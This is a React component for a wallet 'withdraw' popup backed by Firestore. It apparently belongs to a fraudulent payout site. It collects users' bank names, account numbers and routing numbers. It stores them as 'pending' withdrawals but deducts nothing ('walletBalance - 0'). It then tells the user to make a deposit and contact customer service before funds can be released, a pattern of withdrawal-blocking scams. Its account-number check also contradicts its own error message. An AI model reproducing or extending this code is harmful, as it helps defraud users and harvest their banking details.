"use client";

import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { doc, updateDoc, arrayUnion, getDoc } from "firebase/firestore";
import { db } from "@/firebase";
import { toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

const WithdrawPopup = ({ onClose, currentUser, showToast }) => {
  const [step, setStep] = useState(1);
  const [bankName, setBankName] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [routingNumber, setRoutingNumber] = useState("");
  const [amount, setAmount] = useState("");
  const [walletBalance, setWalletBalance] = useState(0); // Wallet balance state
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({});

  // Fetch wallet balance when component mounts
  useEffect(() => {
    const fetchWalletBalance = async () => {
      if (!currentUser) return;

      try {
        const userDocRef = doc(db, "users", currentUser.uid);
        const userDocSnap = await getDoc(userDocRef);

        if (userDocSnap.exists()) {
          setWalletBalance(userDocSnap.data().walletBalance || 0); // Ensure balance defaults to 0
        }
      } catch (error) {
        console.error("Error fetching wallet balance:", error);
      }
    };

    fetchWalletBalance();
  }, [currentUser]);

  const validateStep1 = () => {
    const newErrors = {};

    if (!bankName) newErrors.bankName = "Bank name is required.";
    if (!accountNumber) newErrors.accountNumber = "Account number is required.";
    else if (!/^\d{0,12}$/.test(accountNumber))
      newErrors.accountNumber = "Account number must be 10–12 digits.";

    if (!routingNumber) newErrors.routingNumber = "Routing number is required.";
    else if (!/^\d{9}$/.test(routingNumber))
      newErrors.routingNumber = "Routing number must be exactly 9 digits.";

    if (!amount) {
      newErrors.amount = "Amount is required.";
    } else if (isNaN(amount) || parseFloat(amount) <= 0) {
      newErrors.amount = "Amount must be a valid number greater than 0.";
    } else if (parseFloat(amount) > walletBalance) {
      newErrors.amount = "Insufficient funds. Please enter a lower amount.";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleNext = () => {
    if (step === 1 && validateStep1()) {
      setStep(2);
    }
  };

  const handleWithdraw = async () => {
    if (!currentUser) {
      toast.error("You must be logged in to withdraw.");
      return;
    }

    if (parseFloat(amount) > walletBalance) {
      toast.error("Insufficient funds for withdrawal.");
      return;
    }

    setLoading(true);

    try {
      const userDocRef = doc(db, "users", currentUser.uid);

      // Deduct the withdrawal amount from the wallet balance
      await updateDoc(userDocRef, {
        walletBalance: walletBalance - 0, // Subtract amount from balance parseFloat(amount)
        withdrawals: arrayUnion({
          bankName,
          accountNumber,
          routingNumber,
          amount: parseFloat(amount),
          date: new Date().toISOString(),
          status: "pending",
        }),
      });

      showToast("Deposit to proceed contact customer service for help.....");

      toast.info("Deposit to proceed contact customer service for help.....", {
        position: "top-right",
        autoClose: 20000,
      });

      onClose();
    } catch (error) {
      console.error("Error processing withdrawal:", error);
      showToast("Withdrawal error...");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-white rounded-lg shadow-lg p-6 max-w-md w-full">
        {step === 1 && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.3 }}
          >
            <h2 className="text-xl font-semibold text-gray-800 mb-4">
              Bank Details
            </h2>
            <p className="text-gray-500 mb-2">
              Wallet Balance: <strong>${walletBalance.toFixed(2)}</strong>
            </p>

            <div className="space-y-4">
              <div>
                <input
                  type="text"
                  placeholder="Bank Name"
                  value={bankName}
                  onChange={(e) => setBankName(e.target.value)}
                  className="w-full p-2 border border-gray-300 rounded-lg"
                />
                {errors.bankName && (
                  <p className="text-red-500 text-sm mt-1">{errors.bankName}</p>
                )}
              </div>

              <div>
                <input
                  type="text"
                  placeholder="Account Number (10–12 digits)"
                  value={accountNumber}
                  onChange={(e) => setAccountNumber(e.target.value)}
                  className="w-full p-2 border border-gray-300 rounded-lg"
                />
                {errors.accountNumber && (
                  <p className="text-red-500 text-sm mt-1">
                    {errors.accountNumber}
                  </p>
                )}
              </div>

              <div>
                <input
                  type="text"
                  placeholder="Routing Number (9 digits)"
                  value={routingNumber}
                  onChange={(e) => setRoutingNumber(e.target.value)}
                  className="w-full p-2 border border-gray-300 rounded-lg"
                />
                {errors.routingNumber && (
                  <p className="text-red-500 text-sm mt-1">
                    {errors.routingNumber}
                  </p>
                )}
              </div>

              <div>
                <input
                  type="number"
                  placeholder="Amount"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="w-full p-2 border border-gray-300 rounded-lg"
                />
                {errors.amount && (
                  <p className="text-red-500 text-sm mt-1">{errors.amount}</p>
                )}
              </div>
            </div>

            <div className="flex justify-end space-x-4 mt-6">
              <button
                onClick={onClose}
                className="bg-gray-300 text-gray-700 py-2 px-6 rounded-lg hover:bg-gray-400 transition-all"
              >
                Cancel
              </button>
              <button
                onClick={handleNext}
                className="bg-[#13c636] text-white py-2 px-6 rounded-lg hover:bg-emerald-400 transition-all"
              >
                Next
              </button>
            </div>
          </motion.div>
        )}

        {step === 2 && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.3 }}
          >
            <h2 className="text-xl font-semibold text-gray-800 mb-4">
              Confirm Withdrawal
            </h2>
            <div className="space-y-4">
              <p className="text-gray-600">Bank Name: {bankName}</p>
              <p className="text-gray-600">Account Number: {accountNumber}</p>
              <p className="text-gray-600">Routing Number: {routingNumber}</p>
              <p className="text-gray-600">Amount: ${amount}</p>
            </div>
            <div className="flex justify-end space-x-4 mt-6">
              <button
                onClick={() => setStep(1)}
                className="bg-gray-300 text-gray-700 py-2 px-6 rounded-lg hover:bg-gray-400 transition-all"
              >
                Back
              </button>
              <button
                onClick={handleWithdraw}
                disabled={loading}
                className="bg-[#13c636] text-white py-2 px-6 rounded-lg hover:bg-indigo-700 transition-all disabled:opacity-50"
              >
                {loading ? "Processing..." : "Confirm Withdrawal"}
              </button>
            </div>
            <div>
              <h1> </h1>
            </div>
          </motion.div>
        )}
      </div>
    </div>
  );
};

export default WithdrawPopup;
